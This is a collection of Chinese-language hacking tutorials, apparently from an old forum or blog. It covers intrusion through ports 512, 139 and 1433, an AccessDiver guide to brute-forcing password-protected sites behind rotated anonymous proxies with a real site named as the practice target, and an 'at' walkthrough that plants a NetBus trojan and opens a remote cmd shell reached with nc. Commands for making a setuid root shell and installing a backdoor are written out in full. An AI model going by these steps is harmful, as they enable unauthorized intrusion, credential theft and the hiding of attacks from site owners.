　　个人观点：1.在IE下，所拥有的只是iusr_machine权限，因而，你不要设想去做越权的事情，如启动telnet、木马等；2.url的跳转下，你将拥有超级用户的权限，好好利用吧3.跳转到哪个目录下，通常只能查看、执行当前目录的文件，不能进入到子目录，如想进入，再跳一次吧！：） 
　　4.此法似乎与对方的防火墙无关哦！ 
　　5.据本人实际操作，发现极易断线，但应与占用服务器资源无关。对方是384M RAM+PIII，是静态IP，主要是做数据库服务器，RAID硬盘，SCSI CD ROM，开机18天了，02：00进去时，仍时常吊线。 
　　　　　　　　　　　　　　　　　 
　　堵漏办法：1.打补丁；2.删掉全拼输入法，用标准就成了嘛^_^；3.服务中关掉：Terminal Services，服务名称：TermService，对应程序名：system32\termsrv.exe； 
　　　　　　　　　　　　　　　　　 
　　　　　　　　　　　　　　　　　 
　　512端口入侵 
　　　　　　　　　　　　　　　　　 
　　已经是第六十几天了，我的Celeron 533仍不知疲倦的跑着JOHN……我是无意中注意到这个网站的，当时只是想看一下，方法是各位大虾都会的FINGER，然后猜用户口令进去的。进去之后PASSWD也没有SHADOWN，直接就可以看到，该系统用的是Digital unix系统，从PASSWD看得出里面的用户只有两个组：root和users，我猜中的就是一users级别的，发现这个级别的用户几乎没有什么权限，TELNET上去后发现/USR/USERS/XXX是各用户的HOME，而它们的属性全是drwx――，也就是说这里的用户是互不信任的关系（这一点大家在各免费主页服务器上经常可以看到），看来猜出再多用户级口令也没有用的。 
　　　　　　　　　　　　　　　　　 
　　　　　　　　　　　　　　　　　 
　　root级的用户只有两名：root和shut.root我用john已跑了60多天，显然不可能再跑出来了，但幸运的是shut口令已跑出来了。我毫不犹豫的telnet上去――然后，网站就关闭了！@#~！#^%，我真笨，怎么没想到shut口令是干什么的？ 
　　　　　　　　　　　　　　　　　 
　　　　　　　　　　　　　　　　　 
　　网站很快就又开启了，我发现shut口令还是没改！这个网管是怎么当的，系统关了也不查一下原因！很显然，这个网站上只有root是有水平的，但他与服务器可能不在同地，对于开、关机之类的事情不能直接操纵，与是给当地的操作员一个root级帐号，然后在。profile文件中做了一个shell，使得帐号一登录就自动关系统。看看系统这么周密的设计，我想root设计这个shell时绝对关掉了path，所以我不打算在优先的path路径中放一同名的shell来阻止它。我如果能改掉这个文件再telnet上去不就是root级了吗？ 
　　　　　　　　　　　　　　　　　 
　　但是shut的HOME目录是drwx――，别的帐号根本进不去。没关系，我试试ftp，530 user shut access denined（被拒绝），users组可以ftp上去同样进不了shut目录。而且该网站根本就没有开WWW服务，怎么办？为这个网站陆陆续续研究了许久，我总是乐观的鼓励自己，“起码我已经知道几十种进不去的方法了……”。“真正的黑客从来都是把困难当作乐趣，敞开的大门你请他进他都不进呢！”如此六十多天过去了，只到有一天…… 
　　　　　　　　　　　　　　　　　 
　　我再一次用haktek扫描该网站，结果如下：Port 21 found. Desc='ftp' Port 23 found. Desc='telnet' Port 25 found. Desc='smtp' Port 79 found. Desc='finger' Port 111 found. Desc='portmap/sunrpc' Port 512 found. Desc='biff/exec' Port 513 found. Desc='login/who' Port 514 found. Desc='shell/syslog' Port 515 found. Desc='printer' Port 1024 found. Port 1025 found. Port 1526 found. Port 1528 found. 
　　　　　　　　　　　　　　　　　 
　　一个以前一直没有注意的Port 512引起我的注意，这个端口是什么时候开的？要知道它可以让用户不登录就可以运行服务器上的命令！！！赶紧试试！ 
　　　　　　　　　　　　　　　　　 
　　打开一个软件winrsh32，填入user和password，在命令中填上ls -la，点运行哇，文件全列出来了，剩下的就简单了：cp /bin/sh /tmp/.temp；chown root /tmp/.temp；chmod 4755 /tmp/.temp.然后再用那个破掉的user级帐号telnet，cd/tmp；。temp.当#映入眼帘时，心却往下一沉，我突然感到一丝落寂……可惜这个root一世小心，却毁在了让shut可以使用512端口上。看来破坏一个世界总是比建立一个世界简单…… 
　　39端口入侵139端口入侵139端口的入侵，主要是通过建立空连接，而获得用户名和共享名，接着用字典法或穷举法来猜测ADMINISTRATORS的密码，这样可获得最高权限。 
　　解决方法：1、禁止匿名共享。 
　　2、禁止管理共享。 
　　1433端口入侵1433端口入侵1433端口的入侵，主要是利用MS SQL SERVER默认sa的密码是空，通过远程执行命令而达到目的，或通过穷举法猜测密码。 

 


【AccessDiver中文使用指南】
AccessDiver中文使用指南

不知道那位朋友翻译写出来，收藏了N久，今天给大家转出来吧不错AccessDiver中文使用指南      

AccessDiver中文使用指南v1.0 By LordOne 一，前言 关于AD以及暴力破解ABC 什么是AD？ AD是AccessDiver的简称，就象MicroSoft被称为 MS一样。AccessDiver是一个安全测试软件，官 方网站是www.accessdiver.com，作者叫Jean， 在Deny.de（一个著名的网络安全论坛）的 support版上经常可以看到他的身影，你可以在 那里向他提出关于这个软件使用和技术方面的疑 问。 就象战斗武器既可以防身，又可以发动攻击一样 ，AD作为一个优秀的安全测试软件同时，也是一 个表现极其出色的暴力破解软件。无论是破解标 准的弹出窗口加密网页，还是HTML加密网页，AD 都显得游刃有余。最难能可贵的是，和Ares这样 为专家级Cracker设计的破解软件不同，AD有着 友好的界面，非常容易上手，尤其适合初涉破解 的新手（Newbie）。当然，拥有强大而齐全功能 的AD同样适合老手使用。因此，AD成为目前互联 网上最受欢迎的暴力破解软件，也就顺理成章了 。 在官方网站www.accessdiver.com上你可以下载 到最新版的AD。目前最流行的版本是V4.76 Build 3044。小圈子里传播的V4.80 Build 3283 目前尚在测试阶段，有诸多Bug，不必使用。 为什么用AD这样的软件可以破解成功？ 有很多新手问过我这个问题。在他们想来，随意 性的用户帐号和密码组合是一个天文数字，怎么 会被人从网络上用暴力测试手段获得呢？ 答案其实可以从你自己身上找到。比方说，你在 公司里的英文名叫Jackie Li，你的信箱是 jackie-li@urcompany.com，密码是jackie0101 （因为你是元旦出生的）。现在，你又要申请一 个免费信箱，那么，想到的第一个帐号会是什么 呢？我想90%以上的概率会是jackie或者jackie -li。你很幸运，你用jackie-li在这个免费邮箱 服务器上注册成功了。接下来要设置密码，你想 到的第一个密码会是什么呢？我想90%以上的概 率会是jackie0101。好，现在，假定这个免费信 箱服务器的网络安全很烂，用户资料被盗，这个 黑客用得来的用户名和密码序列去测试你们公司 的邮件服务器，会发生什么情况呢？很明显，他 用jackie-li:jackie0101成功的进入了你的公司 信箱。这是一种成功破解的典型例子。 我们再来探讨一个例子。某天，你要把一个10多 兆的文件共享给一个朋友，邮件没办法发，就临 时到Yahoo申请了一个公文包，而你的朋友没有 Yahoo帐号，于是你就把公文包的帐号和密码告 诉了你的朋友。在这种情况下，你的帐号和密码 会怎样设置呢？很多人会设成诸如test:test、 abc:123、asdf:123456、zhangsan:lisi等等非 常易记的序列（当然，这里需要指出的是，诸如 admin、test、abc等帐号在Yahoo服务器是属于 稀缺资源，拥有者不可能设置这么简单的密码， 我用Yahoo做例子，只是打个比方而已）。于是 ，如果有窥视者正在侦测服务器，这些简单的序 列就轻而易举的被命中了。 现在理解了么？成功破解思路一：用A服务器上 的可用帐号密码序列去测试B服务器（当然，前 提是A服务器和B服务器有很大的相关性），注意 ，是“可用”，而不是“曾经可用”而现在已经 “死亡”的帐号密码序列；成功破解思路二：构 造特定服务器上最可能出现的帐号密码序列进行 测试，所谓“最可能”出现，既包括诸如 “abc:abc”这些通用的组合，也包括与服务器 内容紧密相关的组合。 使用AD进行暴力破解会产生安全问题么？ 使用不当，当然会产生安全问题。最常见的情况 是，被频繁请求骚扰的服务器侦测出破解企图， 于是发出警报，启动反击程序，释放大量的Fake （虚假）应答，迷惑测试者，并记录一切攻击行 为。假定你使用的是固定IP（比方说，你下班后 在公司悄悄干活），这个IP就被记录并被通知相 关部门，你就吃不了兜着走了；假定你使用拨号 上网，临时IP也被记录并被通知相关ISP，ISP一 查记录，你也会吃不了兜着走。 所以，暴力破解的另一个关键要素就是：匿名代 理服务器。注意，代理服务器有很多种。很多代 理服务器表面上给你提供代理服务，却会悄悄的 把你的真实IP透露给那一头的服务器；另外一些 代理服务器则属于某些公司或者机构的网关 （gateway），处于网管高度的监控之下，你的 频繁造访很快会引起他的注意并切断你的攻击行 为。所以，有一个高质量的匿名代理服务器，也 是成功破解的一个前提条件。 有了大容量的破解字典和高质量的代理服务器， 就一定能用AD破解成功了么？ 答案当然是“否”。从网上轻易得来的大容量字 典，通常是黑客抓来的整个加密帐号密码文件被 破译后构成的。这样的字典可能已经被人使用过 N次了。设想一下，如果你是Jackie，你的 jackie-li:jackie0101被人破解了，你会怎么做 ？很明显，你会气急败坏的把所有相关密码甚至 帐号更改掉。这样，jackie-li:jackie0101这个 序列还有存在的必要么？如果目标服务器要求所 有的用户名为数字，那么你的“abc:abc”序列 还有测试的必要么？如果目标服务器的帐号和密 码是随机产生并用邮件发送给用户的，你辛苦手 工构造的字典序列还有测试的必要么？如果目标 服务器用户数量少得可怜，你的字典再庞大又有 何用？ 此外，即便你的字典和代理都是高质量的，可是 你设置有问题，轻易的被服务器探测到了你的攻 击行为，并迅速采取了防范措施，你还是会一无 所获。 所以，尽管暴力破解看起来很“傻瓜”，但也并 不是“傻瓜”就能做好的。 好了，闲扯这么多，该进入正题了。 AccessDiver中文使用指南（二） 二，破解前的准备 首先，确保你联入Internet，无论是拨号上网还 是局域网上网。网速越快越好，机器内存越大越 好（可以承受更多的并发测试线程）。 其次，确保你机器上安装了AccessDiver4.76。 如果还没装，就到www.accessdiver.com下载一 个并装上。安装过程非常简单，和普通的软件没 什么差别。AD可以在Windows系统（包括97、98 、ME、2000和XP）上安装，如果你是麦金托什用 户，你可以在视窗虚拟系统内运行它。 第三，确保你有一个测试目标。所谓的测试目标 ，首先是一个具体的服务器，比如 http://www.testserver.com/，其次是这个服务 器的加密区域入口地址，比如 http://www.testserver.com/members/，这个入 口地址有个特点，就是当你把它输入到浏览器的 URL栏位内，回车进入时，会弹出让你输入用户 名和密码的小窗口。如果你甚至还不知道该去破 解哪个站点，那么你读这篇文章做什么。 第四，确保你有一个有的放矢的破解字典 （wordlist）。字典是个文本文件，格式构成是 这样的："用户名:密码"，中间的冒号也可以是 空格，或者TAB键。如下面的序列： abc:123 user:password test:test admin:admin 注意，字典要有针对性。预先把不符合目标服务 器要求的序列删除，比方说，目标服务器要求用 户的帐号和密码控制在6到8位，你就应该把帐号 和密码长度小于6而大于8的序列去掉。关于如何 处理字典，我在后文中将有详细说明。如果你不 明白，就随便找个字典（甚至可以使用AD自带的 字典）先试验试验吧。另外一个重要问题是字典 该多大才合适？我的建议是，实在没必要用超过 一万行的字典进行胡乱测试！那是在浪费时间。 如果你大致上学会了使用AD，就应该想办法去搞 到命中率高的字典，而不是搞一个巨大无比（甚 至超过1M）的字典在那里耗时间。 第五，确保你有一个高质量的匿名代理服务器列 表。代理服务器的简单原理如下： 请求 请求 主机 <-->代理服务器<-->服务器 反馈 反馈 对你的主机而言，你外部连接的只是代理服务器 ，而不是目标服务器，同样，目标服务器的反馈 也是通过代理再传送给你的主机。这样做有两个 好处：第一，你的本地网管不会知道你在连接非 法网站（如果局域网有网管的话）；第二，如果 你的攻击行为被目标服务器侦测到的话，暴露的 IP也只是代理服务器的地址，而不是你的主机IP 地址；第三，周期性的轮换代理服务器，攻击行 为被目标服务器发觉的概率就要小得多。所谓匿 名代理，就是无需你输入用户名和密码进行验证 就可以使用的那些代理，这往往是因为某些机构 的网管业务水平不到家或者疏忽所导致的。这就 是为什么匿名代理会很快死亡的原因，网管察觉 漏洞了嘛。不过，这个网管学乖了，还是有其他 蹩脚网管留下空子给你钻的J。 匿名代理服务器列表是个文本文件，构成格式是 这样的："服务器IP地址（或者主机名）:端口" 。可能你是个网络菜鸟，连端口是什么都不知道 ，没关系反正依样画葫芦就行。如下面的序列： 63.238.139.7:80 63.242.157.227:8080 http://www.harlemschoolofthearts.org:80 http://www.childrenpalace.edu.vn:3128 注意，尽管AD使用的代理服务器列表可以使用主 机名，如上面第三、第四个，但其他一些破解软 件（如Ares）可能必须使用数字IP，因此在处理 代理服务器的时候，尽量使用主机IP。如何得到 高质量的匿名服务器列表？这是一个很大的课题 ，我后面会讨论到。还有一个问题就是，代理服 务器列表需要多大才合适？这得看你的目标服务 器特点。如果目标服务器安全措施非常好，动不 动就把你的代理封掉，那代理当然是多多益善了 ；如果你的目标服务器用一个代理服务器就能搞 定，那就找一个最快的代理吧。另外，你的字典 越大，一般而言，需要的代理也越多。不过，好 的匿名代理是一种稀缺资源，所以，你更应该着 想的是怎样才能让你的代理不被封掉，而不是找 更多的代理。 第六，确保你有一个安全的环境。破解不是一件 光荣而可以到处炫耀的事情，所以能秘密就尽量 保持秘密吧。破解的时候，你其实可以做其他事 情，如下棋，聊天，喝茶，等等，或者干脆把显 示器关掉（当然，前提是破解软件的设置必须在 优化状态下，以确保运行无须监测）。 如果你第四，第五个条件无法达到，就到破解论 坛上向老手们要吧。 AccessDiver中文使用指南（三） 三，第一次启动AD "第一次"总是充满了新奇、刺激、和兴奋。现在 ，就开始你的第一次启动AD吧。 AD装完后，Windows桌面上会有一个绿色的骷髅 图标，双击它运行AD。接下来会跳出一个警示框 ，第二次运行就不会出现了。不必理会，单击进 入。 进入AD后，首先跳入眼帘的是AD的LOGO以及作者 的声明。单击LOGO，取消之。这个LOGO会在每次 启动AD的时候出现。你既然已经读过Jean的声明 了，就不必再费时间，因此可以设置一下，去掉 这个声明。这个我后文会说到。 我们来看一下AD的界面布局。从上往下从左往右 依次说明。 1，菜单 菜单有五项，除了第一项My Skill（技术等级选 择），其余的后面有专题讨论。尽管AD很容易上 手，但毕竟是一个复杂的软件，所以AD设置了三 个技术等级：Newbie（新手级），Familiar（熟 手级），Expert（专家级）。默认是新手级。拿 破仑有句话，叫"不想做将军的士兵不是好士兵" ，所以，第一次打开AD，你就把技术等级设置到 专家级吧。胆子大一些，步子迈得更大一些，别 怕，有我指导呢。AD设为专家级状态后，界面会 有一些变化，别在意。My Skill菜单里还有几个 简化模式（Custom Modes）可供选择，其实专家 级设定里都包含它们了，因此不必理会。 2，测试进度条 有"0%"字样的黑色框是进度条，表示你当前的测 试进展到什么程度了。 3，启动以及终止按钮 有闪电图标、"Standard"字样的是标准测试模式 按钮，最右边有"HTML"字样的是html测试模式按 钮，有手状图标、"Stop"的是终止测试的按钮。 测试有弹出窗口的加密网页，就是点击左边 的"Standard"按钮，而测试有HTML窗体的加密网 页，则点击右边的"HTML"按钮。对新手而言，点 击的就是左边那个"Standard"按钮了。 4，服务器入口地址（server） 在启动按钮中间的文本框（默认写着Type here the address of your secured web zone (http://.......)），是用来输入测试网站的入 口页面的，也就是会弹出窗口的那个网页链接， 比方“http://www.testserver.com/members/” 。当你做过一次测试后，AD会把测试的服务器地 址存下来，文本框右侧的下拉菜单可以查到最近 测试过的服务器。 5，测试速度（test speed） AD可以同时开99个测试线程，只要你的带宽和系 统资源可以承受的话。但事实上，大多数情况下 都不能开这么多线程，因为开太多线程会很容易 的被远端服务器所监测到，并启动反击程序，而 且，太多线程很容易使代理服务器被服务器所禁 掉。AD默认开50个线程，一般情况下需要调整。 用鼠标点住滚动条，就可以左右调整测试线程（ Bots）数了。 Server和Test speed窗口周围还有一些小的快捷 按钮，这些以后会有说明。 6，广告栏 AD是个共享软件，无须注册，就放了两个广告而 已。你点击广告，广告条会消失，但下次启动AD 的时候，广告又会出现。不过为了支持一下Jean ，你不妨点击两下。 7，功能按钮和状态窗口 这部分是最主要的，我将结合实例给出说明。 AccessDiver中文使用指南（四） 四，第一次尝试破解 现在，你要进行你的第一次破解之旅了！！为了 使讲解更明了，我将使用真实服务器。选择谁做 测试目标呢？Karupspc！为什么选择它？呵呵， 谁让它是个大站呢，所谓枪打出头鸟么。 Karupspc的服务器地址是www.karupspc.com，我 们现在要找到它的注册用户入口地址。打开IE， 在浏览器URL内输入www.karupspc.com，回车， Karupspc的欢迎首页就出现了。点击声明下面的 “ENTER”进入下一页showme.htm。showme.htm 有很多花花绿绿的广告图片，不要被迷惑了去胡 乱点，注意页面底部，有三个按钮，分别是 “JOIN NOW”、“MEMBERS”和“WEBMASTERS” 。点击“MEMBERS”，进入登录页面login.htm。 在这一页，我们看到，该站提供了两种登录方式 ，我们需要的是主要的登录“Click Here for our Main Login”。如果你点击这个链接，就会 跳出一个登录窗口，让你输入用户名和密码。我 们现在需要的是这个链接的具体URL地址。 得到这个URL地址的方法有很多种，最常用一种 是用右键点开一个新窗口，再点弹出小窗口的“ 取消”键，页面返回出错信息，通常浏览器地址 栏内的URL就是我们所需要的；第二种是把鼠标 左键放在链接上，然后看浏览器的状态栏信息； 第三种（也是最万无一失的）就是直接查看 login.htm的HTML源代码。我们三种方法分别试 验。 用第一种方法，当点击了取消键后，要迅速点击 浏览器的“停止”键，否则页面会跳转到一个叫 “denied.htm”的出错网页。这样，我们就得到 了所需要的入口地址： http://www.karupspc.com/members/members.sh tml。用第二种方法，得到的结果和上面的一样 。用第三种方法，点击浏览器的“查看”―― > “源文件”，就得到了login.htm的源代码。通 过关键字“Main Login”就可以迅速定位： “Click Here for our Main Login” (http://www.karupspc.com/members/members.s html)，于是目标也一样达到了。 好，得到了目标网站的会员入口地址，这是破解 的第一步。现在，打开AD，在AD的“Server”栏 位内输入 “http://www.karupspc.com/members/members. shtml”（用复制粘贴就可以了）。 接下来，我们要调整一下AD的测试速度。 Karupspc不是个烂站，它的反测试功能还是满强 大的，开过多的线程，会让你的代理服务器迅速 死光光。通常你对一个站点不了解的话，就保守 一些，把线程开少一些。比如这次就开10个。向 左移动滚动条，右边的数值会减小，到10左右停 下。 然后是装载字典。AD会默认装载你上次使用的字 典。如果你第一次使用AD，则它会装载一个自带 的字典（当然了，这个字典毫无价值）。按照如 下顺序点击功能按钮：Dictionary―― >Currently used――>Load a combo file，选 择你的字典文件并加载之。你可以看到下面有两 个黑色窗口，左边是用户名，右边是对应的密码 。窗口下面会给出该文件的路径和文件名，比如 “D:\tmp\wordlist.txt”。 字典装完了，接下来要设置和装载代理列表。注 意，下面的步骤极其重要！ Proxy――>My list――>Use WEB proxies（一 定要选中该框）――>Rotate proxies () logins before swapping（一定要选中该框）， logins前面的文本框内，输入2。 上面的步骤是什么意思呢，就是说这次测试，需 要使用代理服务器，每个代理使用两次（测试两 个帐号密码）就切换到下一个代理服务器，如此 循环往复的测试。一般而言，为保险起见， Rotate proxies的数值应为1到2个，当然，某些 网站你可以更大。继续设置。 Proxy skipping――>Change proxies on errors（4xx/5xx）（选中） Proxy skipping――>Change Proxies on fake replies（选中） Proxy skipping――>Change proxies on redirections（选中） Proxy skipping――>Change proxies on specific HTML keyword（不选） Proxy skipping――>Retry the user:pass again after skipping（不选） 上面是处理代理出错的选项。如果收到4xx或者 5xx的错误信息，如果收到虚假应答，如果遇到 网页转向，则略过该代理。所谓略过，就是本轮 测试中，该代理将不被使用（比方Rotate proxies值是100，某代理在第一次测试时遇到上 述出错信息，则该代理将不再做余下的99次测试 ）。 Proxy error handling――>Don't use the proxy after it has been skipped（选中） Proxy error handling――>Continue to use timedout proxies（不选） 上述选项表示AD收到的某些错误信息，如403（ 表示IP被目标服务器封了），404（表示主机与 代理的连接出了问题），5XX等，该代理将被剔 除出测试列表。 Reactivation (used when no more proxy available)――>Don't reactivate proxies (=stop process) 上述选项表示，如果所有代理都被剔除，测试终 止。该设置有一选项是“Reactive all proxies ”，就是重新激活所有被剔除的代理服务器（只 激活一次，因此不会陷入死循环），这一般是没 有必要的。 好，代理设置大致上就完成了，现在装载代理列 表。看AD最右侧数下来第二个打开文件样的按钮 ，那就是用来装载代理列表文件的。我的文件是 D:\tmp\proxylist.txt，装载后，列表就在窗口 内出现了。每个代理前面都有一个复选框，选中 则表示该代理将参与本次测试。我们当然要全部 选中了。鼠标右键单击右边第一个按钮，则所有 代理均被选中。现在，我们要选择一个代理作为 测试的起始代理，鼠标左键随便点击一个，加亮 就OK了。 除此之外，还有一个小地方需要设置。Settings ――>Access――>stop a security test after finding () weak logins，在这个选项下面，选 中“Never stop－continue untill the end” 。当然，你如果想成功一个就收手，那就不要选 择这个复选框了。。不过，其实可以随时点击 AD的“Stop”按钮停止测试的啊。 设置好了么？那就鼠标点击“Standard”按钮， 开始你的第一次破解历程吧！ 一点击运行按钮，AD立刻会多了一个主功能按钮 “Progression”，点击它，你会看到黑色窗口 滚动的白色状态信息。上面的窗口，是监控线程 运行状态，下面左边的窗口，是返回代理服务器 的应答，下面右边的窗口，则是用来放置成功破 解信息的。每当有一个成功的测试结果，AD会发 出欢畅的声音通知你。注意，选中“Don't hide this section after a test completion”。这 样，当测试结束后，这个“Progression”窗口 还会存在，供你分析使用。测试过程中，鼠标左 键点击“Found logins”窗口内的weak login（ 就是成果获取的用户名和密码），会弹出一个新 的浏览器窗口自动进行登录。 测试结束后，weak login自动保存到历史记录中 。History――>Weak logins found。双击其中 的任意一条历史记录，系统会打开浏览器窗口自 动登录。 你的初次破解历程感觉如何？呵呵。为了增加你 的信心，我在后面附了一个100行的字典列表（ 大约有4、5个weak login），一个大约200行的 匿名代理列表（level1-level3，全?*杀?Karupspc接受），供你练习。注意，你的目的是 练习，测试成功后不要进了Karupspc就出不来， 这样会杀了那几个weak login，后面的练习者就 无法感受成功了！！ AccessDiver中文使用指南（五）――理?五，用AD处理代理服务器列表 在破解论坛上，经常有新手问，从哪里可以 找到大量匿名代理服务器。一般而言，有两 种方式： 第一种，自己用专门工具扫描IP网段寻找代 理。记得6年前，我还在念书的时候，就用一 个名叫ProxyHunter的小工具扫描CERNET， 以期能跳出CERNET这个小圈子。AD也提供 了Proxy Hunter，功能类似。Proxy――> Proxy Hunter，输入起始和结束IP地址， 就让机器自动搜索吧。自己找代理有个好处， 就是找到的代理只是较少Cracker或者就自 己一人使用，这样，代理死亡的几率就小得 多。不过，对于付费上网的朋友而言，这种 方式的代价就太昂贵了些。此外，整个网段 整个网段的扫描IP端口，会很容易的被警惕 的网管发觉，他们会采取相应反击措施，这 个也不可不防（这就是说，做这等事的时候， 最好也通过一个SOCKS代理，把自己的真实 IP隐藏起来）。 第二种，用工具到专门免费发布代理的网站 上抓取（leech）代理。Internet向来以共 享闻名，不管被共享的资源是合法的，还是 非法的。代理服务器也一样。很多网站会定 期的向外公布站长扫描得到的代理列表。你 到特定地址手工抓取当然也可以，但效率不 高。通常的方式是把许多公布代理列表的网 址链接放在某个文本文件内，再用专门软件 分析该网页并抓取代理。AD就提供了这个功 能，Proxy――>Web Proxy Leecher。现在， 我们来一次实战演习。 网站“http://www8.big.or.jp/~000/CyberSyndrome/” 提供匿名代理，其公布代理的网页有两个， 分别是http://www8.big.or.jp/~000/CyberSyndrome/pla2.html 和http://www8.big.or.jp/~000/CyberSyndrome/plb2.html。 建立一个文本文件proxyleechurl.txt， 存储类似的链接。在AD的Web Proxy Leecher 界面上，点击左侧打开文档图标（鼠标放上 去的时候，提示“Add URL site to the list from a file”）， 弹出文件打开窗口，选择已建文件proxyleechurl.txt。 文件打开后，可以看到AD蓝底窗口内， 出现了上述两个链接，称为“zone”。 鼠标右键单击窗口左侧的带勾的选择键， 选中所有zone，然后点击下面的“Start Leeching” 键。AD会分析每个页面，并直接把代理部 分抓出来，显示在右侧的“Proxies Found” 黑色窗口内。然后点击右下角的存盘图标， 把得到的代理存成一个文本文件proxynocheck.txt， 以待分析。或者你也可以直接点击“Add these proxies in…―― >Add these proxies into the Proxy ANALIZER” 按钮，把这些代理直接放到AD的Proxy Analizer 中等待验证。 AD的Proxy Leecher大抵就是这样了。还有很 多其他的代理工具，其leeching功能也和AD类似。 通过AD的Proxy Leecher，现在，已经有了1000多 个匿名代理了。但是，这些代理并不是都好用的。 代理无效的原因很多，多数是因为网管发现了 问题，把漏洞弥补上了。因此，在使用之前， 需要对这些初步抓取来的代理进行验证。验证 主要有两个方面，第一个是看这个代理能否连通， 简单的Ping一下就可以了；第二个是看这个代理 的匿名程度如何，这就需要专门的程序代码进行 了。AD提供了代理验证的功能，Proxy――>Proxy ANALIZER。 进入AD代理验证界面，点击左侧输入文件的图标， 打开刚刚保存的proxynocheck.txt（如果刚才 直接把代理装进代理验证，就免了这个步骤了）。 可以看到，每个代理有以下几个属性：地址 （IP或者域名），端口（80，8080，3128等）， IP地址，正确度，匿名度，延迟时间。选中所 有代理（任意选择一个，然后按键盘上的“a” 就可以了），先进行正确度校验。 点击右下角的Parameters键进行普通参数 设置。选中“Export only IP Adresses in your lists”，这样，AD会把代理格式 全部转换成“IP地址:端口”的形式。 “Auto-deletion of bad proxies after a test completion”，即自动删除坏的代理， 还是不要选中的好。因为有的时候如果你 的内部网络有问题，代理测试会全通不过， 这样会把好的代理也删掉。测试完后可以手工删除。 点击右下角的Special进行特殊参数设置。 可以看到有个项目叫“Use the Server URL above as the reference during the test”，就是说，测试连通的时候， 以你预先在服务器入口地址输入的URL为准， 而不是你的本地IP。确定选择第一项， “Don’t use this future”。为什么 要这样做呢？因为你现在要建立的是一个 普通的可用代理列表，而不是针对特定服 务器的。如果选择了第三项“The URL is password protected (Basic authentication)”， 则所有无法与该服务器连接的代理（包括 一些被该服务器禁掉但可以用于其他服务 器的代理）均被视为坏的。只有当你要测 试某个特定服务器时，才应该对通用的代 理列表进行特定验证。 另外，你还修改一下AD默认的代理超时设定 （左下角），把原来的15秒改得更短或者更长。 设置完之后，点击“Speed/Accuracy Tester” 进行测试。测试完毕后，点击“Delay”按钮， 把代理按延迟时间进行排序。无时间的，显然 不是超时（TimeOut）就是其他访问错误，因 此全部删掉。这里有个问题需要注意，如果你 测试下来，绝大部分结果是“#404-Connetion refused”，则很有可能你的内部网络有问 题，而不是代理有问题了，常见的原因是网 关掉包。除删除不能连通的之外，延迟太长， 也可以删掉。我通常只保留延迟在10000秒以 内的代理。如何删除？选 中要删的代理，点击“X”按钮。 现在，我大约得到了约一半可以连通的代理。 但是，这些代理的匿名程度如何，还需要进 行下一步的验证。 验证一个代理的匿名程度如何，需要通过一 些CGI脚本代码的校验，这些脚本通常叫 “ProxyJudge”，比如AD4.83默认的“http://www10.cds.ne.jp/~ktake/proxy/prxjdg.cgi”。 PJ一般也是由一些热心人士放在一些免 费的服务器上，经常会死掉，也属于稀缺 资源一类。 通过校验的匿名代理，一般分成如下5类， 分别是level1到level5，在AD的Anonymous 一栏内会标识。Level越小，匿名程度越高， 也就是越好。比如，level1的代理会被WEB 服务器当作一个普通IP。一般而言，破解普 通网站，从level1到level5都可以使用， 但是，一些特殊的站点，就需要level2以 上的代理了。 现在进行匿名度验证。选中所有刚才正确度 测试通过的代理，点击右下角“ProxyJudge”， 选中AD默认的PJ。如果你要更换，则在右下角 的URL栏内输入PJ地址，点击“+”，然后选 中你新增的PJ。点击“Confidentiality Tester”，开始匿名度测试。 测试完毕后，点击“Anonymous”，把代理进 行排序，然后删除非匿名代理。对TimeOut的 代理，则用其他的PJ再进行测试。测试完毕 后，把通过的代理另存一个文件。我通常只 保留level1到level3的代理。当然，level4 和level5的代理也是可以用的。 这里还有一个问题，就是代理服务器所处的 区域问题。一般而言，使用代理有一个原则， 就是不能用国内的，以免麻烦，尤其是使用 单位网络的。但是，AD没有这个区域测试判 断功能。这是一个缺憾。我常使用AATOOLS， 这是目前最好的代理测试软件
 


【at命令及服务】
at命令及服务 
ytmjcf 发表于 2006-4-8 20:23:00 
at： 排定在特定的日期和时间运行某些命令和程序。 
运行 AT 命令之前必须先启动 Schedule 服务。瞧，现炒就得现卖，刚学了net命令，但这个start命令我可没详述，自已看看帮助文件，摸索一下各种命令的用法吧。 
C：》net start schedule 
Schedule 正在启动服务..... 
Schedulw 服务启动成功。 

AT ［computername］ ［ ［id］ ［／DELETE］ ／DELETE ［／YES］］ 
AT ［computername］ time ［／INTERACTIVE］ ［ ／EVERY：date［，...］ ／NEXT：date［，...］］ "command" 

computername 指定远程计算机。 如果省略这个参数,命令会被排定在本机上运行。 
id 指定给排定进度命令的识别号。 
／delete 删除某个已排定进度的命令。如果省略标识，计算机上所有已排定进度的命令都会被删除。 
／yes 用于删除所有作业，且不想在运行删除时显示确认信息 。 

time 指定命令运行的时间。 
／interactive 允许作业在运行时，与用户通过桌面交互。 
／every：date［，...］ 指定在每周或每月的某日 （或某几日） 运行命令。 
如果省略日期，则默认为在每月的本日运行。 
／next：date［，...］ 指定在下一个指定日期 （如，下周三），运行命令。如果省略日期，则默认为在每月的本日运行。 

"command" 准备运行的 Windows NT 命令或批处理文件。

知道了如何使用AT，再来看看如何在远程NT上运行ntsrv.exe： 
1 利用管理员登陆到目的服务器，方法为： net use x.x.x.xipc￥ "adminpwd" ／user："adminuser"（这里具体方法可参见KILLUSA的文章《HOW TO GET IN NT》） 
2 利用ntsrv.exe启动远程： netsvc x.x.x.x schedule ／start 
3 利用AT.EXE在远程服务器设置程序定时运行，当然最快运行最理想，所以，你可以用letmein.exe得到服务器的时间，然后： 
at x.x.x.x 00：00 ntsrv.exe ／port：64321 
其中00：00要改为用letmein.exe得回来的具体时间+一点容量，等一会后，再在本地启动netbus.exe，键入目的服务器得ip地址或hostname，连接！比如第一种方法，你想要在目的服务器运行诸如病毒之类的东东，可以利用netbus得上传功能，将各种“大补丸”上传至目的服务器，再用netbus的"Start program"，键入完整路径，就ok了！第二种方法是利用netbus的“App redirect”功能，启动远程telnet服务，如下：在netbus中击“App redirect”，键入"C：》winntsystem32cmd.exe"，Port为：4321，服务就启动了，然后在本地运行：nc x.x.x.x 4321，出现dos启动的画面就表示连接成功： 
Microsoft（R） Windows NT（TM）（C） Copyright 1985-1996 Microsoft Corp. 
C：》 

 
 


【at的启动方法】
为了能够使用at命令，肉鸡必须开有schedule的服务，如果没有开启，可用流光里带的工具netsvc.exe或sc.exe来远程启动，当然其方法也可以，只要能启动schedule服务就行

net start schedule

【CGI 安全漏洞资料速查】
CGI 安全漏洞资料速查 
日期：2003年10月10日 

类型：攻击型 
名字：phf 
风险等级：中 
